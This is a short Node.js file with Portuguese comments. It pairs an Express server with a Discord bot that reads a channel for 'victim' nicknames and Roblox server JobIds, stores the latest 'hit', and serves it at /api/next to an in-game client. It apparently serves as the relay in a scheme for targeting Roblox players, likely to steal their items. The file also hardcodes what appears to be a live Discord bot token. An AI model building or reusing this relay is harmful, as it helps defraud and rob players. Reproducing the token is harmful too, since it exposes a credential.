const express = require('express');
const { Client, GatewayIntentBits } = require('discord.js');
const app = express();
app.use(express.json());

// 1. CONFIGURAÇÕES (Onde o bot vai olhar)
const DISCORD_TOKEN = "MTUwNDExMzExMjkzOTQ5NTU0NQ.GewT_9.U2JOs7TkEfi7RZGOcwAs67GaDAEex4SmcSiJcg"; 
const CHANNEL_ID = "1502418752946573362"; 

// Memória temporária para guardar o alvo
let currentHit = {
    jobId: null,
    victimNick: null,
    placeId: 142823291
};

// 2. LÓGICA DO BOT (Ouvir o Discord)
const client = new Client({ 
    intents: [
        GatewayIntentBits.Guilds, 
        GatewayIntentBits.GuildMessages, 
        GatewayIntentBits.MessageContent
    ] 
});

client.on('messageCreate', async (message) => {
    // Filtro: canal certo e ignora outros bots
    if (message.channel.id !== CHANNEL_ID || message.author.bot) return;

    const content = message.content;
    
    // Extrai o JobId e o Nick usando padrões (Regex)
    const jobIdMatch = content.match(/[a-f0-9-]{30,}/);
    const nickMatch = content.match(/(?:Victim|User|Nick):\s*(\w+)/i) || content.match(/(\w+)/);

    if (jobIdMatch) {
        currentHit.jobId = jobIdMatch[0];
        currentHit.victimNick = (nickMatch && nickMatch[1]) ? nickMatch[1] : "Alvo";
        console.log(`[PONTE] Novo alvo capturado: ${currentHit.victimNick}`);
    }
});

client.login(DISCORD_TOKEN);

// 3. ROTAS DA API (Onde o Roblox vai perguntar)
app.get('/api/next', (req, res) => {
    res.json(currentHit);
});

// Rota para limpar o alvo se quiser
app.get('/api/clear', (req, res) => {
    currentHit = { jobId: null, victimNick: null, placeId: 142823291 };
    res.send("API Resetada");
});

// 4. LIGAR O SERVIDOR
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
});
